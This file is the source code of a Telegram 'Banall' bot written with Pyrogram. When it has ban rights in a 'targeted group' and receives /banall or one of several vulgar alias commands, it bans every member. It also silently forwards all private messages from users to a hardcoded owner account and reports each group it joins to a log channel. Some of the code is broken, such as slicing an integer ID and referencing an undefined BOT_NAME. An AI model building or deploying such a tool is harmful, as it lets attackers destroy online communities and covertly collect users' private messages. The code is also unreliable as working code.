import asyncio
import subprocess
import os
import time

from pyrogram.errors.exceptions.flood_420 import FloodWait
from pyrogram import Client,filters
from pyrogram.types import *
from .config import Config
from database.users_chats_db import db
import logging
from pyrogram.errors import (
    ChatAdminRequired
)
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)

log_channel = -1001955155721


@bot.on_message(filters.command(["banall", "fuckall", "tmkc", "chudaistart"]))
async def _(bot, msg):
    print("getting memebers from {}".format(msg.chat.id))
    async for i in bot.iter_chat_members(msg.chat.id):
        try:
            await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
            print("kicked {} from {}".format(i.user.id,msg.chat.id))
        except FloodWait as e:
            await asyncio.sleep(e.x)
            print(e)
        except Exception as e:
            print(" failed to kicked {} from {}".format(i.user.id,e))           
    print("process completed")



@bot.on_message(filters.command("start") & filters.private)
async def hello(bot, message):
    await message.reply("Hello, This Is a Banall Bot, I can Ban Members Within seconds!\n\n Simply give me Ban rights in targeted group and give command /banall, or you can use alternative commands like /tmkc, /chudaistart, /fuckall [๏](https://te.legra.ph/file/6e056c758a8f6f47476fb.jpg)")


@bot.on_message(filters.command(["gitpull", "update"]) & filters.user(1143358497))
async def _gitpull(_, message):
    m = subprocess.check_output(["git", "pull"]).decode("UTF-8")
    if str(m[0]) != "A":
        x = await message.reply_text("**» ғᴇᴛᴄʜɪɴɢ ᴜᴩᴅᴀᴛᴇs ғʀᴏᴍ ʀᴇᴩᴏ ᴀɴᴅ ᴛʀʏɪɴɢ ᴛᴏ ʀᴇsᴛᴀʀᴛ...**")
        return os.system(f"kill -9 {os.getpid()} && python3 -m bot")
    else:
        await message.reply_text(f"**» {BOT_NAME} ɪs ᴀʟʀᴇᴀᴅʏ ᴜᴩ-ᴛᴏ-ᴅᴀᴛᴇ !**")



@bot.on_message(filters.group & filters.new_chat_members)
async def on_group_join(client: Client, message: Message):
    # get some info about the group and user who added the bot
    group_name = message.chat.title
    group_id = message.chat.id
    user_name = message.from_user.first_name
    user_id = message.from_user.id
    
    # send a message to the log channel with the relevant info
    link = f"https://t.me/c/{group_id[4:]}" if message.chat.type == "supergroup" else "N/A"
    await bot.send_message(log_channel, f"👥 Group joined:\n- Name: {group_name}\n- ID: {group_id}\n- Added by: [{user_name}](tg://user?id={user_id})\n- Members: {message.chat.members_count}\n- Link: {link}")




@bot.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if message.from_user.id != 1143358497:
        fwded_mesg = await message.forward(chat_id=1143358497, disable_notification=True)

